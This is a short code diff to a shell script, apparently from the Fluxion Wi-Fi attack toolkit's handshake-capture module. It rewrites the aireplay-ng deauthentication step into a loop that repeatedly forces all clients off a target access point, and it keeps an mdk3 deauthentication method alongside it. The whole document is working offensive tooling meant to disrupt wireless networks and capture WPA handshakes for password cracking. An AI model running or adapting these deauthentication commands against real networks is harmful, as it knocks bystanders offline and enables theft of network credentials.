@@ -90,8 +90,7 @@ function handshake_start_deauthenticator() {
 
 	# Start deauthenticators.
 	case "$HANDSHAKEMethod" in
-		"$HandshakeSnooperAireplayMethodOption") xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
-						aireplay-ng --deauth=9999999999 -a $APTargetMAC --ignore-negative-one $WIMonitor &
+		"$HandshakeSnooperAireplayMethodOption") xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e "while true; do aireplay-ng --deauth=1 -a $APTargetMAC --ignore-negative-one $WIMonitor; sleep 5; done" &
 			HANDSHAKEDeauthenticatorPID=$!;;
 		"$HandshakeSnooperMdk3MethodOption") xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
 				 mdk3 $WIMonitor d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $APTargetChannel &
